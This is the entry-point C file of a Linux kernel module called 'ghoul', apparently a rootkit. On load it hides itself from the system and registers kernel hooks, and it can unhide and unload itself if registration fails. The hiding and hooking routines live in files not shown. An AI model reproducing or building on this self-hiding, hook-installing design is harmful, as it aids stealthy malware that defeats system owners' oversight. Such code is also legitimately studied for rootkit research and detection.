#include <linux/module.h>
#include "load.h"
#include "hooks.h"

int hooks_installed = 0;

notrace static int __init ghoul_init(void)
{
    int err;

    pr_info("ghoul: inserted\n");
    hide_self();

    err = register_hooks();
    if (err) {
        pr_err("ghoul: failed registering hooks (error code %d)\n", err);
        goto unload;
    }
    hooks_installed = 1;
    goto out;

unload:
    // show self and unload
    show_self();
    unload_self();
out:
    return 0;
}

notrace static void __exit ghoul_exit(void)
{
    if (hooks_installed)
        unregister_hooks();
    free_allocations();
    pr_info("ghoul: removed\n");
}

module_init(ghoul_init)
module_exit(ghoul_exit)
MODULE_LICENSE("GPL");